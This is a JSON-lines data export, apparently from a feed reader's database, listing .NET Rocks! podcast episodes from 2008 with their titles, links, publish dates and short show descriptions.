{"k":"0000000082","o":"0000000424","v":"001"}
{"_id":519,"_uid":519,"_dt":1373728934123,"_s":"05255342d8dd5bc7d8c36d66bae9acfa"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=373","title":"Randell and Woodward on TFS 2008 and Beyond!","published":{"$wrap":"$date","v":1220328000000,"h":"2008-09-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Brian Randell and Martin Woodward talk about Team Foundation Server 2008, and all the goodness within.","author":false,"_id":{"$wrap":"$oid","v":519}}
{"k":"0000000082","o":"0000000504","v":"001"}
{"_id":520,"_uid":520,"_dt":1373728934124,"_s":"bcd9c547148735af9e1bea9d9555fc02"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=372","title":"Live from devLink 2008!","published":{"$wrap":"$date","v":1219896000000,"h":"2008-08-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard break out the microphone during Karaoke night (don't worry) at the DoubleTree bar in Murphreesboro, TN, to talk to staff and attendees of the devLink Technical Conference (August 22-23).","author":false,"_id":{"$wrap":"$oid","v":520}}
{"k":"0000000082","o":"0000000427","v":"001"}
{"_id":521,"_uid":521,"_dt":1373728934124,"_s":"897036cd2b3804e22079f79fd79d6a2a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=371","title":"Thiago Silva on Reporting Services for SQL2008","published":{"$wrap":"$date","v":1219723200000,"h":"2008-08-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Thiago Silva about the new features of Reporting Services for SQL Server 2008.","author":false,"_id":{"$wrap":"$oid","v":521}}
{"k":"0000000082","o":"0000000493","v":"001"}
{"_id":522,"_uid":522,"_dt":1373728934125,"_s":"a5ecbabe8d9ce428c4ed300dfa432bfc"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=370","title":"Soma!","published":{"$wrap":"$date","v":1219291200000,"h":"2008-08-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Richard and Carl talk to Microsoft Executive S. Somasegar about his experiences at Microsoft from his early days working on systems like OS/2, NT, Windows 2000 to overseeing the Developer Division of Microsoft.","author":false,"_id":{"$wrap":"$oid","v":522}}
{"k":"0000000082","o":"0000000604","v":"001"}
{"_id":523,"_uid":523,"_dt":1373728934126,"_s":"6ca1e611c15243477275e35dec6200b6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=369","title":"Dan Simmons and Stephen Forte on the EF Advisory Council","published":{"$wrap":"$date","v":1219118400000,"h":"2008-08-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Dan Simmons is back with Stephen Forte, a member of the EF Advisory Council, a group of outsiders who were brought in to help shape future direction for the EF. You might be surprised at who else was on the council, and what they are thinking about for the next version.","author":false,"_id":{"$wrap":"$oid","v":523}}
{"k":"0000000082","o":"0000000493","v":"001"}
{"_id":524,"_uid":524,"_dt":1373728934126,"_s":"d2cdeba14319fc14b86679443cabbfaa"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=368","title":"Steve Smith on the Transition to Entrepeneur","published":{"$wrap":"$date","v":1218772800000,"h":"2008-08-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Steven Smith talk with Carl and Mark Dunn about changing careers from software developer to small business owner. All three have made the jump and share their experiences.","author":false,"_id":{"$wrap":"$oid","v":524}}
{"k":"0000000082","o":"0000000497","v":"001"}
{"_id":525,"_uid":525,"_dt":1373728934127,"_s":"3d2d0eff3512683f42a99001746fe2bd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=367","title":"Udi Dahan Scales Web Applications!","published":{"$wrap":"$date","v":1218513600000,"h":"2008-08-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Udi Dahan is back to talk to the guys about scaling web applications. This is an area of expertise for Richard as well as Udi, so you know you'll get your money's worth out of this one!","author":false,"_id":{"$wrap":"$oid","v":525}}
{"k":"0000000082","o":"0000000450","v":"001"}
{"_id":526,"_uid":526,"_dt":1373728934128,"_s":"d792ad0c6c646692b6be03323049cd3a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=366","title":"Eric Swedin Looks Back in Time","published":{"$wrap":"$date","v":1218081600000,"h":"2008-08-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Mark Dunn joins Carl for this fun look back at the history of computers with Eric Swedin, author of Computers: The Life Story of a Technology.","author":false,"_id":{"$wrap":"$oid","v":526}}
{"k":"0000000082","o":"0000000496","v":"001"}
{"_id":527,"_uid":527,"_dt":1373728934129,"_s":"6e77c6b66d02df64dcd86df789707be5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=365","title":"Daniel Simmons on Entity Framework v1!","published":{"$wrap":"$date","v":1217908800000,"h":"2008-08-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Dan Simmons is back this time to announce the release of the Entity Framework, and to answer some questions about it's architecture and use. Version 1 will ship around August 11th.","author":false,"_id":{"$wrap":"$oid","v":527}}
{"k":"0000000082","o":"0000000416","v":"001"}
{"_id":528,"_uid":528,"_dt":1373728934129,"_s":"2779899563e133a02d81c856f20a493f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=364","title":"Stacy Harris Does Home Automation!","published":{"$wrap":"$date","v":1217476800000,"h":"2008-07-31T04:00:00.000Z"},"starred":false,"read":false,"content":"Charles Stacy Harris talks about technologies used to automate his home using .NET interfaces. Geek out!","author":false,"_id":{"$wrap":"$oid","v":528}}
{"k":"0000000082","o":"0000000425","v":"001"}
{"_id":529,"_uid":529,"_dt":1373728934130,"_s":"861e33455f3a03a60e1ba07e4d45e3a8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=363","title":"Kate Gregory Develops in C++ for Vista!","published":{"$wrap":"$date","v":1217304000000,"h":"2008-07-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard catch up with Kate Gregory to talk Vista, VB, C++, and her latest thoughts and experiences.","author":false,"_id":{"$wrap":"$oid","v":529}}
{"k":"0000000082","o":"0000000567","v":"001"}
{"_id":530,"_uid":530,"_dt":1373728934131,"_s":"853c8854fa2450a07f4b31bf4655750d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=362","title":"James Kovacs Inverts our Control!","published":{"$wrap":"$date","v":1216872000000,"h":"2008-07-24T04:00:00.000Z"},"starred":false,"read":false,"content":"James Kovacs talks about the Castle Windsor project, and gives the clearest definitions of Inversion of Control (IOC) containers, Dependency Injection, and the reasons why we need to think about these techniques. Critical listening for all .NET developers.","author":false,"_id":{"$wrap":"$oid","v":530}}
{"k":"0000000082","o":"0000000451","v":"001"}
{"_id":531,"_uid":531,"_dt":1373728934131,"_s":"452de30d2046991a345e8d5a9bcf76e9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=361","title":"Jeffrey Richter on the Windows Memory Model","published":{"$wrap":"$date","v":1216699200000,"h":"2008-07-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Jeff Richter is back to talk about how Windows manages memory, from the early versions of Windows to the .NET Framework. Geek out!","author":false,"_id":{"$wrap":"$oid","v":531}}
{"k":"0000000082","o":"0000000462","v":"001"}
{"_id":532,"_uid":532,"_dt":1373728934132,"_s":"3da56b59f033d66f6290c65dd90c76e8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=360","title":"Ted Neward and Joel Pobar on Rotor 2.0","published":{"$wrap":"$date","v":1216267200000,"h":"2008-07-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Ted Neward and Joel Pobar talk about Rotor, the open source .net framework reference implementation. Ted and Joel have written a book on Rotor 2.0","author":false,"_id":{"$wrap":"$oid","v":532}}
{"k":"0000000082","o":"0000000490","v":"001"}
{"_id":533,"_uid":533,"_dt":1373728934133,"_s":"849871c267a2db0b333e35a0dabea903"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=359","title":"Brian Randell on Hyper-V and Virtualization","published":{"$wrap":"$date","v":1216094400000,"h":"2008-07-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Brian Randell is back to talk about Microsoft Virtualization technologies focusing on Hyper-V, the kernel-level virtualization technology built into Windows Server 2008.","author":false,"_id":{"$wrap":"$oid","v":533}}
{"k":"0000000082","o":"0000000480","v":"001"}
{"_id":534,"_uid":534,"_dt":1373728934133,"_s":"cce6dff86026c8730519336e6072d7ad"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=358","title":"TechEd 2008 Software Quality Panel","published":{"$wrap":"$date","v":1215662400000,"h":"2008-07-10T04:00:00.000Z"},"starred":false,"read":false,"content":"This is as close to Jerry Springer as we get! A great panel discussion from TechEd 2008 about balancing software quality with other factors such as cost and time taken.","author":false,"_id":{"$wrap":"$oid","v":534}}
{"k":"0000000082","o":"0000000513","v":"001"}
{"_id":535,"_uid":535,"_dt":1373728934134,"_s":"2f91d4f5fff3e98879b648b4c8295c9a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=357","title":"Nathan Pocock on OPC and Factory Automation","published":{"$wrap":"$date","v":1215489600000,"h":"2008-07-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard get the skinny from Nathan Pocock on OPC (open process collabaration), and the advances made using OPC as a comprehensive interface with PLCs (programmable logic controllers).","author":false,"_id":{"$wrap":"$oid","v":535}}
{"k":"0000000082","o":"0000000433","v":"001"}
{"_id":536,"_uid":536,"_dt":1373728934135,"_s":"8a445ab5fcdf5f1200f8d35594950f76"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=356","title":"XML Literals Panel from TechEd 2008","published":{"$wrap":"$date","v":1215057600000,"h":"2008-07-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard host a panel discussion at the TechEd Online stage at TechEd 2008, subtitled How I Learned to Love Dim.","author":false,"_id":{"$wrap":"$oid","v":536}}
{"k":"0000000082","o":"0000000431","v":"001"}
{"_id":537,"_uid":537,"_dt":1373728934135,"_s":"241bf0d5dfc228f788d1e8c89438daea"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=355","title":"Ted Faison Takes Events to the Limit!","published":{"$wrap":"$date","v":1214884800000,"h":"2008-07-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Ted Faison as part of the whole back to basics initiative at DNR about Event-Driven design.","author":false,"_id":{"$wrap":"$oid","v":537}}
{"k":"0000000082","o":"0000000555","v":"001"}
{"_id":538,"_uid":538,"_dt":1373728934136,"_s":"c765157f136d3d6da8e876266475e484"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=354","title":"Donald Belcham and Kyle Baley on Brownfield Applications","published":{"$wrap":"$date","v":1214452800000,"h":"2008-06-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Donald Belcham and Kyle Baley talk to Carl and Richard about inheriting existing (brownfield) applications. The focus of this talk is on setting up the environment before tackling the code with a special focus on testing.","author":false,"_id":{"$wrap":"$oid","v":538}}
{"k":"0000000082","o":"0000000414","v":"001"}
{"_id":539,"_uid":539,"_dt":1373728934137,"_s":"a29fe15b03ceba424ea9bd73f43209c3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=353","title":"Smart Client Panel at TechEd 2008","published":{"$wrap":"$date","v":1214280000000,"h":"2008-06-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard interview Glenn Block, Steve Lasker, and Tim Huckaby on the state of the Smart Client.","author":false,"_id":{"$wrap":"$oid","v":539}}
{"k":"0000000082","o":"0000000446","v":"001"}
{"_id":540,"_uid":540,"_dt":1373728934137,"_s":"2264dfbb9cb922d38b226b04ce5077c5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=352","title":"Eric Brechner on IM Wright's Hard Code","published":{"$wrap":"$date","v":1213848000000,"h":"2008-06-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Eric Brechner, the author of the book 'I. M. Wright's Hard Code', an opinion blog (and book) with a tude!","author":false,"_id":{"$wrap":"$oid","v":540}}
{"k":"0000000082","o":"0000000402","v":"001"}
{"_id":541,"_uid":541,"_dt":1373728934138,"_s":"5cf7d3145398ea262ad3f956b89746ba"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=351","title":"Rick Strahl on AJAX and jQuery","published":{"$wrap":"$date","v":1213675200000,"h":"2008-06-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Rick Strahl takes us on a tour through using jQuery to do all the heavy lifting in JavaScript.","author":false,"_id":{"$wrap":"$oid","v":541}}
{"k":"0000000082","o":"0000000471","v":"001"}
{"_id":542,"_uid":542,"_dt":1373728934139,"_s":"61033ab4ea2f6de2041026c314f4a271"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=350","title":"Dan and Kathleen on Kids and Computing","published":{"$wrap":"$date","v":1213243200000,"h":"2008-06-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Dan Appleman and Kathleen Dollard have a lot to say about kids: computing, and programming. This is a great show for parents or anyone who works with kids.","author":false,"_id":{"$wrap":"$oid","v":542}}
{"k":"0000000082","o":"0000000460","v":"001"}
{"_id":543,"_uid":543,"_dt":1373728934139,"_s":"71c51854de0230864eadd6f2225e6cb3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=349","title":"Scott Hunter on Microsoft Dynamic Data","published":{"$wrap":"$date","v":1213070400000,"h":"2008-06-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk with Scott Hunter on Microsoft's Dynamic Data Runtime, which provides scaffolding and dynamic data services to developers.","author":false,"_id":{"$wrap":"$oid","v":543}}
{"k":"0000000082","o":"0000000433","v":"001"}
{"_id":544,"_uid":544,"_dt":1373728934140,"_s":"562f2024c0ca5014296daecc66453dbe"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=348","title":"Scott Stanfield on Deep Zoom and PhotoSynth!","published":{"$wrap":"$date","v":1212638400000,"h":"2008-06-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott Stanfield talks about Deep Zoom, PhotoSynth, his Mix keynote, and all the cool toys he gets to play with.","author":false,"_id":{"$wrap":"$oid","v":544}}
{"k":"0000000082","o":"0000000380","v":"001"}
{"_id":545,"_uid":545,"_dt":1373728934141,"_s":"03b9966db860d2aa3fbce45adc44d429"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=347","title":"John Lam Updates Us on IronRuby!","published":{"$wrap":"$date","v":1212465600000,"h":"2008-06-03T04:00:00.000Z"},"starred":false,"read":false,"content":"John Lam talks about his work with the DLR and Iron Ruby at Microsoft.","author":false,"_id":{"$wrap":"$oid","v":545}}
{"k":"0000000082","o":"0000000552","v":"001"}
{"_id":546,"_uid":546,"_dt":1373728934142,"_s":"326744a3b3bc7eb4e091ca110d808f2d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=346","title":"Future of .NET Panel at DevTeach Toronto","published":{"$wrap":"$date","v":1212033600000,"h":"2008-05-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard host a panel comprised of Oren Eine, Ted Neward, and Scott Belware at the DevTeach conference in Toronto. What started out as a discussion about the future turned into a discussion about Microsoft's development tools.","author":false,"_id":{"$wrap":"$oid","v":546}}
{"k":"0000000082","o":"0000000421","v":"001"}
{"_id":547,"_uid":547,"_dt":1373728934142,"_s":"e9b429369fad2b54fb137477df302c95"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=345","title":"Dmitri Ossipov on Enterprise Service Bus","published":{"$wrap":"$date","v":1211860800000,"h":"2008-05-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Dmitri Ossipov from Microsoft about ESB architecture and specifically Biztalk.","author":false,"_id":{"$wrap":"$oid","v":547}}
{"k":"0000000082","o":"0000000479","v":"001"}
{"_id":548,"_uid":548,"_dt":1373728934143,"_s":"e634515901d46350cc2ca123c603e48b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=344","title":"Building Communities at Dallas TechFest","published":{"$wrap":"$date","v":1211428800000,"h":"2008-05-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk with three community leaders in Dallas about building communities, and specifically how you can directly benefit from participating locally.","author":false,"_id":{"$wrap":"$oid","v":548}}
{"k":"0000000082","o":"0000000486","v":"001"}
{"_id":549,"_uid":549,"_dt":1373728934144,"_s":"ebecadbf6d7c931679fd6a167aa202ca"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=343","title":"Jeffrey Richter on the Direction of Hardware","published":{"$wrap":"$date","v":1211256000000,"h":"2008-05-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard welcome back Jeffrey Richter to the show. Jeff is a consultant for Microsoft with a unique perspective on the evolution of Windows and PC hardware.","author":false,"_id":{"$wrap":"$oid","v":549}}
{"k":"0000000082","o":"0000000462","v":"001"}
{"_id":550,"_uid":550,"_dt":1373728934144,"_s":"33885cda52a548041cad7adc6e7f6eb8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=342","title":"Dan Wahlin on Silverlight 2.0 and WPF","published":{"$wrap":"$date","v":1210824000000,"h":"2008-05-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Dan Wahlin chats with Carl and Richard in front of a live audience at DevConnections in Orlando about his experiences with Silverlight 2.0 and WPF.","author":false,"_id":{"$wrap":"$oid","v":550}}
{"k":"0000000082","o":"0000000378","v":"001"}
{"_id":551,"_uid":551,"_dt":1373728934145,"_s":"97290947a2632baf0394df2804808d8e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=341","title":"64-Bit with Brian Peek","published":{"$wrap":"$date","v":1210651200000,"h":"2008-05-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk with Brian Peek about the latest and greatest in 64-bit.","author":false,"_id":{"$wrap":"$oid","v":551}}
{"k":"0000000082","o":"0000000491","v":"001"}
{"_id":552,"_uid":552,"_dt":1373728934146,"_s":"968921c9f0dff8d85b7b39cd9959e3f1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=340","title":"Brad Abrams and Omar Khan Announce .NET 3.5 SP1 and VS2008 SP1","published":{"$wrap":"$date","v":1210564800000,"h":"2008-05-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Brad Abrams and Omar Khan from Microsoft officially announce .NET 3.5 SP1 and Visual Studio 2008 SP1, and detail all the new features and improvements!","author":false,"_id":{"$wrap":"$oid","v":552}}
{"k":"0000000082","o":"0000000438","v":"001"}
{"_id":553,"_uid":553,"_dt":1373728934146,"_s":"9422bbaac28edfce8e8aa6e7b5262e05"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=339","title":"Phil Haack on Model View Controller","published":{"$wrap":"$date","v":1210046400000,"h":"2008-05-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Phil Haack from Microsoft catches us up on his latest goings-on in The Collective, and talks about the ASP.NET MVC Framework.","author":false,"_id":{"$wrap":"$oid","v":553}}
{"k":"0000000082","o":"0000000527","v":"001"}
{"_id":554,"_uid":554,"_dt":1373728934147,"_s":"3fabf83f68a31c6870c2734ffb88e89f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=338","title":"Mark Miller on the Science of Good UI","published":{"$wrap":"$date","v":1209614400000,"h":"2008-05-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Good user interface design can be done by sticking to some good rules and avoiding common mistakes. You don't need to be a latte-sippin tattoo-wearin macbook-carrying designer to create user interfaces that work.","author":false,"_id":{"$wrap":"$oid","v":554}}
{"k":"0000000082","o":"0000000384","v":"001"}
{"_id":555,"_uid":555,"_dt":1373728934148,"_s":"65c6543629073ab26c9c81ecbb00599d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=337","title":"Jim Webber on Guerilla SOA!","published":{"$wrap":"$date","v":1209441600000,"h":"2008-04-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk SOA with Jim Webber, who has a lot to say on the subject.","author":false,"_id":{"$wrap":"$oid","v":555}}
{"k":"0000000082","o":"0000000431","v":"001"}
{"_id":556,"_uid":556,"_dt":1373728934149,"_s":"9cb597be46f68823bb1e19815ad07b0a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=336","title":"Marc Mercuri Unveils RoboChamps!","published":{"$wrap":"$date","v":1209009600000,"h":"2008-04-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Marc Mercuri is back to announce a great new website and program for developers on Microsoft Robotics Studio, RoboChamps!","author":false,"_id":{"$wrap":"$oid","v":556}}
{"k":"0000000082","o":"0000000516","v":"001"}
{"_id":557,"_uid":557,"_dt":1373728934151,"_s":"a9e2b0c1d75bbc4e9f3e1dcc6658376d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=335","title":"Jonathan Zuck on the Politics of OOXML","published":{"$wrap":"$date","v":1208836800000,"h":"2008-04-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Jonathan Zuck from ACT (Association for Competitive Technology) is back to talk about OOXML (Open Office XML), the EU vs. Microsoft, and other political issues that impact you as a software developer.","author":false,"_id":{"$wrap":"$oid","v":557}}
{"k":"0000000082","o":"0000000476","v":"001"}
{"_id":558,"_uid":558,"_dt":1373728934152,"_s":"6235c4ab720c6ce8b908dc726382bfbf"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=334","title":"Developing for Second Life","published":{"$wrap":"$date","v":1208404800000,"h":"2008-04-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Chris Hart, Kyle G, and Zain Naboulsi about developing software for Second Life, and how the world of .NET intersects with the virtual world of SL.","author":false,"_id":{"$wrap":"$oid","v":558}}
{"k":"0000000082","o":"0000000560","v":"001"}
{"_id":559,"_uid":559,"_dt":1373728934152,"_s":"ed0b31bef03ce2484e06485f859f77c3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=333","title":"It's the ALT.NET Show!","published":{"$wrap":"$date","v":1208232000000,"h":"2008-04-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Jeremy Miller and David Laribee discuss their work with ALT.NET, a \"self-organizing, ad-hoc community of developers bound by a desire to improve ourselves, challenge assumptions, and help each other pursue excellence in the practice of software development.\"","author":false,"_id":{"$wrap":"$oid","v":559}}
{"k":"0000000082","o":"0000000533","v":"001"}
{"_id":560,"_uid":560,"_dt":1373728934153,"_s":"62fca796144e2dc5bca8875d4c78c27d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=332","title":"Ted Neward on the New Language Renaissance","published":{"$wrap":"$date","v":1207800000000,"h":"2008-04-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Ted Neward is back to tell us his ideas around the recent downpour of language technology. He also answers a few questions left over from Carl's interview of his Java-developer brother, Jay Franklin, in show #326.","author":false,"_id":{"$wrap":"$oid","v":560}}
{"k":"0000000082","o":"0000000557","v":"001"}
{"_id":561,"_uid":561,"_dt":1373728934154,"_s":"62a64d2a7872015be67159381b3e6b11"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=331","title":"Stephen Toub on Concurrency - Live in NYC!","published":{"$wrap":"$date","v":1207627200000,"h":"2008-04-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Stephen Toub from Microsoft talks about new tools coming forth for dealing with concurrency and asynchronous programming. This was recorded live in front of an audience at the MS Financial Services Developer Conference in NYC last month.","author":false,"_id":{"$wrap":"$oid","v":561}}
{"k":"0000000082","o":"0000000507","v":"001"}
{"_id":562,"_uid":562,"_dt":1373728934155,"_s":"1525528bdda53fd13b1d71e328f41318"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=330","title":"Rocky Lhotka on CSLA.NET 3.5","published":{"$wrap":"$date","v":1207195200000,"h":"2008-04-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Rocky is back on .NET Rocks! to talk about the latest iteration of his CSLA.NET Application Framework, as well as to talk about some .NET technologies that are no longer as necessary as they once were.","author":false,"_id":{"$wrap":"$oid","v":562}}
{"k":"0000000082","o":"0000000433","v":"001"}
{"_id":563,"_uid":563,"_dt":1373728934156,"_s":"168bc5f4f453147a669025ad9ce8574d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=329","title":"Kevin McNeish on DSLs and Software Factories","published":{"$wrap":"$date","v":1207022400000,"h":"2008-04-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Kevin McNeish about Domain Specific Languages (DSL), Software Factories, and the like.","author":false,"_id":{"$wrap":"$oid","v":563}}
{"k":"0000000082","o":"0000000479","v":"001"}
{"_id":564,"_uid":564,"_dt":1373728934157,"_s":"113353efc13b112a044e2ef3602b6b03"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=328","title":"Joel Semeniuk on the State of Team System","published":{"$wrap":"$date","v":1206590400000,"h":"2008-03-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Joel Semeniuk stops by to talk about problem solving with Team System and Team Foundation Server, and to give us the skinny on the features of Team System 2008.","author":false,"_id":{"$wrap":"$oid","v":564}}
{"k":"0000000082","o":"0000000437","v":"001"}
{"_id":565,"_uid":565,"_dt":1373728934158,"_s":"efae97781d74e562e5bb6fcde0ce5e14"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=327","title":"Jon Goodyear on Instant Messaging APIs","published":{"$wrap":"$date","v":1206417600000,"h":"2008-03-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Jonathan Goodyear tells us about his work with Instant Messaging protocols, and his soon to be released toolkit for .NET.","author":false,"_id":{"$wrap":"$oid","v":565}}
{"k":"0000000082","o":"0000000563","v":"001"}
{"_id":566,"_uid":566,"_dt":1373728934159,"_s":"71fc56cb4289b09a70d393582c56b729"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=326","title":"Jay Franklin is a Java Programmer!","published":{"$wrap":"$date","v":1205985600000,"h":"2008-03-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Brother Jay makes his debut on .NET Rocks! with stories of his experiences as a Java developer from the early days in VB class through MUMPS and landing finally in Java land. Also, be listening for a special musical performance at the end of the show.","author":false,"_id":{"$wrap":"$oid","v":566}}
{"k":"0000000082","o":"0000000478","v":"001"}
{"_id":567,"_uid":567,"_dt":1373728934160,"_s":"de44408a820d0acb977c60da669af40c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=325","title":"Barry Dorrans revisits Security with OpenID and Cardspace","published":{"$wrap":"$date","v":1205812800000,"h":"2008-03-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Barry Dorrans has a good time with Carl and Richard talking about his history in the business and his passion for OpenID and Information Cards.","author":false,"_id":{"$wrap":"$oid","v":567}}
{"k":"0000000082","o":"0000000458","v":"001"}
{"_id":568,"_uid":568,"_dt":1373728934160,"_s":"49ee70e302e7a69bd0857a848f73f185"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=324","title":"Emre Kiciman on AjaxView","published":{"$wrap":"$date","v":1205380800000,"h":"2008-03-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Emre Kiciman about AjaxView, a project from Microsoft Research to analyze the performance of web applications from the client side.","author":false,"_id":{"$wrap":"$oid","v":568}}
{"k":"0000000082","o":"0000000408","v":"001"}
{"_id":569,"_uid":569,"_dt":1373728934161,"_s":"918ae19453214bd60485ad3e39d3fa9e"}
